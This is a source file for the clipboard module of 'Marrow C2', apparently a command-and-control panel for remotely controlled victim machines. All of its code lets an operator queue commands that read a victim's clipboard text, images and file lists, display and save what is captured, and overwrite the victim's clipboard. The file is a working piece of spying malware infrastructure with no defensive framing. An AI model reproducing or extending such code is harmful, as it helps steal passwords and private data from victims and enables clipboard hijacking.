<?php
// Marrow C2 - Clipboard Module
// Get text, image, set clipboard
?>
<div id="clip-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Toolbar -->
    <div class="h-12 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <span class="text-white font-medium">📋 Clipboard</span>
        <div class="flex items-center gap-2">
            <button onclick="CLIP.get()"
                class="px-4 py-2 bg-[#10b981] hover:bg-[#0ea573] text-white rounded-lg text-sm font-medium">
                📥 Get Clipboard
            </button>
            <button onclick="CLIP.getImage()"
                class="px-4 py-2 bg-[#6366f1] hover:bg-[#5558e3] text-white rounded-lg text-sm font-medium">
                🖼️ Get Image
            </button>
        </div>
    </div>

    <!-- Content -->
    <div class="flex-1 p-4 flex gap-4">
        <!-- Text -->
        <div class="flex-1 flex flex-col">
            <div class="text-xs text-gray-500 uppercase tracking-wider mb-2">Clipboard Text</div>
            <textarea id="clip-text" readonly
                class="flex-1 bg-[#0f1219] border border-[#1e2433] rounded-xl p-4 text-white font-mono text-sm resize-none focus:outline-none"></textarea>
            <div class="mt-3 flex gap-2">
                <input type="text" id="clip-set-input" placeholder="Text to set..."
                    class="flex-1 bg-[#1a1f2e] border border-[#1e2433] rounded-lg px-4 py-2 text-white text-sm focus:outline-none focus:border-[#6366f1]">
                <button onclick="CLIP.set()"
                    class="px-4 py-2 bg-[#6366f1] hover:bg-[#5558e3] text-white rounded-lg text-sm font-medium">
                    📤 Set
                </button>
            </div>
        </div>

        <!-- Image -->
        <div class="w-80 flex flex-col">
            <div class="text-xs text-gray-500 uppercase tracking-wider mb-2">Clipboard Image</div>
            <div id="clip-image-box"
                class="flex-1 bg-[#0f1219] border border-[#1e2433] rounded-xl flex items-center justify-center overflow-hidden">
                <div id="clip-no-image" class="text-center text-gray-500">
                    <div class="text-4xl mb-2 opacity-50">🖼️</div>
                    <p class="text-sm">No image</p>
                </div>
                <img id="clip-image" class="max-w-full max-h-full object-contain hidden">
            </div>
            <button onclick="CLIP.saveImage()"
                class="mt-3 px-4 py-2 bg-[#1a1f2e] hover:bg-[#252b3d] text-gray-300 rounded-lg text-sm">
                💾 Save Image
            </button>
        </div>
    </div>

    <!-- Files -->
    <div class="h-24 bg-[#0a0f1a] border-t border-[#1e2433] p-4">
        <div class="text-xs text-gray-500 uppercase tracking-wider mb-2">Clipboard Files</div>
        <div id="clip-files" class="flex gap-2 overflow-x-auto text-sm text-gray-400">
            No files in clipboard
        </div>
    </div>
</div>

<script>
    const CLIP = {
        imageData: null,

        get() {
            queueCommand('clipboard');
        },

        getImage() {
            queueCommand('clipboard_image');
        },

        set() {
            const text = document.getElementById('clip-set-input').value;
            if (text) {
                queueCommand('clipboard_set', text);
            }
        },

        render(data) {
            try {
                const info = JSON.parse(data);

                document.getElementById('clip-text').value = info.text || '';

                if (info.files && info.files.length > 0) {
                    document.getElementById('clip-files').innerHTML = info.files.map(f =>
                        `<span class="px-3 py-1 bg-[#1a1f2e] rounded-lg">📄 ${f}</span>`
                    ).join('');
                } else {
                    document.getElementById('clip-files').innerHTML = 'No files in clipboard';
                }
            } catch (e) {
                document.getElementById('clip-text').value = data;
            }
        },

        renderImage(data) {
            try {
                const info = JSON.parse(data);

                if (info.hasImage && info.data) {
                    this.imageData = info.data;
                    const img = document.getElementById('clip-image');
                    img.src = 'data:image/png;base64,' + info.data;
                    img.classList.remove('hidden');
                    document.getElementById('clip-no-image').classList.add('hidden');
                } else {
                    document.getElementById('clip-no-image').classList.remove('hidden');
                    document.getElementById('clip-image').classList.add('hidden');
                }
            } catch (e) { }
        },

        saveImage() {
            if (this.imageData) {
                const a = document.createElement('a');
                a.href = 'data:image/png;base64,' + this.imageData;
                a.download = `clipboard_${Date.now()}.png`;
                a.click();
            }
        }
    };
</script>